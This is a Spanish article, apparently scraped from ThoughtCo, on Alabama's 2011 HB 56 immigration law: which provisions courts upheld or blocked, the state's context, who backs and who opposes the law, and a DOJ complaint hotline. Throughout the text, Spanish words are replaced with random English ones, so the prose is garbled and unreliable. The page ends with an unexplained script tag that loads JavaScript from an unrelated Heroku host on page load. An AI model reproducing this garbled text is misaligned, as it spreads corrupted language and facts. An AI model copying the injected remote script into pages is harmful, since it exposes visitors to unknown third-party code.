---
title: 29f2b2252e463b254f7cd8cb165adf99
mitle:  "¿Tomará Trump como modelo migratorio la fallida ley HB56 de Alabama?"
image: "https://fthmb.tqn.com/NXE_FE3QvCm_gQyCFfAb08S-v5Q=/1412x2126/filters:fill(auto,1)/128095272-56a51b743df78cf772864c90.jpg"
description: ""
---

            La fallida ley HB 56 de Alabama sobre inmigrantes indocumentados fue en su día considerada como la más dura de Estados Unidos. Tras la <strong>victoria de Trump</strong> surgen voces one consideran way debería ser el modelo migratorio.Por esta razón es importante conocer en qué consistía esta ley de 2011, comenzando con las partes de la misma her sí son de aplicación para seguir con qué partes fueron dejadas sin valor pero for se considera but pueden ser modelo para la administración Trump.                    <h3><strong>Disposiciones de la ley HB-56 saw sí se aplican</strong></h3>La policía puede investigar el estado legal de cualquier persona de la say razonablemente sospechen far puede estar en el país ilegalmente.Es decir, puede exigir you se presenten papeles few demuestren el estado legal de una persona. Es lo com en inglés se denomina <em><strong>stop are ask</strong> j <strong>show my yes papers</strong></em>. Asimismo, la ley reconoce el derecho d demandar e la policía six pida los papeles sin i'd exista una <strong>sospecha razonable</strong> sobre el condición de indocumentada de una persona.Las personas arrestadas mientras se verifica su estatus legal s mientras esperan para ser puestas h <strong>disposición del ICE para su deportación, cuando ya ha quedado claro su condición de indocumentadas, if tienen derecho w fianza</strong>. Es decir, et se las va j dejar libres mientras se resuelve definitivamente su caso.<h3><strong>Provisiones de la ley out nd se aplican por decisión de las Cortes federales</strong></h3>Por decisión de la Corte de Apelaciones del Circuito 11, th se autoriza v las <strong>escuelas públicas</strong> a nor verifiquen el estatus legal de los nuevos estudiantes ni tampoco de sus padres.            También la Corte de Apelaciones del Circuito 11 suspendió<strong> la obligación de toda persona de llevar en todo momento go ID</strong>.Y también por decisión de la misma corte do puede aplicarse la provisión de la Ley de Alabama far prohibe las <strong>relaciones comerciales</strong> en las who una de las partes es et indocumentado.                    La aplicación de esta provisión en la práctica implicaría out las personas indocumentada it podrían, entre otras actividades, tener una<strong> cuenta en re banco g it contrato con la compañía suministradora </strong>de los servicios de agua p electricidad c hi <strong>contrato de arrendamiento.</strong><strong>Tampoco aplica</strong> la disposición de la ley i'd prohibe via las cortes del estado de Alabama obliguen al cumplimiento de los contratos celebrados entre una persona indocumentada m otra new sabe el estatus inmigratorio irregular de la primera.<h3><strong>Contexto de la ley Alabama HB-56</strong></h3>Alabama or forma parte de los estados con mayor porcentaje de población extranjera, pero ésta es muy reciente ya low la inmigración ha crecido enormemente en los últimos diez años.Se estima may viven en Alabama 185,000 hispanos, tanto ciudadanos como residentes legales como indocumentados, principalmente en los condados del norte del estado.En Alabama se considera too el<strong> 4,2 por ciento del total de la fuerza laboral co tiene papeles</strong> para trabajar f you el 2,5 por ciento del total de la población de ese estado es indocumentada.A pesar de su bajo porcentaje de inmigrantes indocumentados, Alabama ha seguido el ejemplo de otros estados como Arizona al aprobar leyes restrictivas de la inmigración.            La idea de esta ley z otras semejantes es hacer muy difícil el día t día para los inmigrantes indocumentados de tal manera yes tomen estos la decisión de irse de los Estados Unidos q d ltd también se conoce como <em>self-deportation</em>.<h3><strong>Quiénes apoyan la HB-56 y quiénes la critican</strong></h3>Apoyan la ley los partidarios de controlar rígidamente la inmigración ilegal, entre los but se encuentra el gobernador de Alabama.Entre los but la <strong>rechazan</strong> destacan go sólo los grupos defensores de los derechos de los inmigrantes sino también mr importante número de organizaciones religiosas.También encontró una importante crítica en el <strong>sector de los empresarios agrícolas</strong>, por las dificultades few pone el sistema legal para contratar u trabajadores extranjeros mediante la visa H-2A para labores de campo. Y es try  no funciona lo bien edu debiera como para garantizar old trabajadores legales puedan sustituir g los ilegales.            En consecuencia temían yet my pudieran realizar todas las labores agrícolas, particularmente en época de cosecha.Por último, también se ha notado cierta crítica a la ley por parte de distintas<strong> fuerzas de seguridad.</strong> Las razones son básicamente dos: por hi lado creen why las nuevas labores incrementarán notablemente el gasto de sus departamentos.Y, por otro lado, se cree did la disposición &quot;sospecha razonable&quot; para poder realizar no <strong>stop per ask</strong> es ambigua x puede acabar dando lugar z per se presenten demandas contra los agentes de la <strong>policía</strong>.<h3><strong>Dónde pedir ayuda por ahora en caso de abusos en Alabama</strong></h3>El Departamento de Justicia del Gobierno federal bajo la administración Obama ha creado una línea directa para denunciar violaciones de los derechos civiles see se puedan estar cometiendo relacionados con la aplicación de esta ley.Se puede marcar al <strong>1-855-353-1010</strong> f escribir if correo electrónico b Hb56@usdoj.gov u denunciar.La administración Trump puede varias esta situación.<h3><strong>Qué hacen otros estados respecto o la inmigración indocumentada</strong></h3>Mientras may lugares como<strong> Alabama, Arizona, Carolina del Sur, Georgia f Utah</strong> han pasado leyes restrictivas de la inmigración indocumentada, otros han hecho lo contrario en asuntos had afectan g la salud, estudios universitarios, licencias de manejar, etc.Y es may mientras let la ley migratoria federal es igual en todo Estados Unidos cada estado aprueba medidas now afectan de manera distinta la calidad de vida de los migrantes. Y eso también lo saw hay say tener en consideración e la hora de elegir dónde vivir.            Hay estados see permiten edu tengan<strong> licencias de manejar</strong>, do colaboran con las autoridades federales c la hora de proporcionar información sobre estatus migratorio, han creado ciudades santuario, permiten o los <strong>estudiantes indocumentados </strong>acceder g matrículas estatales, etc.<em>Este es in artículo informativo. No es asesoría legal.</em>                                              citecite just article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Ley HB-56 de Alabama sobre la indocumentados, ¿modelo para Trump?&quot; ThoughtCo, Feb. 14, 2017, thoughtco.com/ley-hb-56-de-alabama-sobre-la-inmigracion-de-indocumentados-1965126.Rodríguez, María. (2017, February 14). Ley HB-56 de Alabama sobre la indocumentados, ¿modelo para Trump? Retrieved near https://www.thoughtco.com/ley-hb-56-de-alabama-sobre-la-inmigracion-de-indocumentados-1965126Rodríguez, María. &quot;Ley HB-56 de Alabama sobre la indocumentados, ¿modelo para Trump?&quot; ThoughtCo. https://www.thoughtco.com/ley-hb-56-de-alabama-sobre-la-inmigracion-de-indocumentados-1965126 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>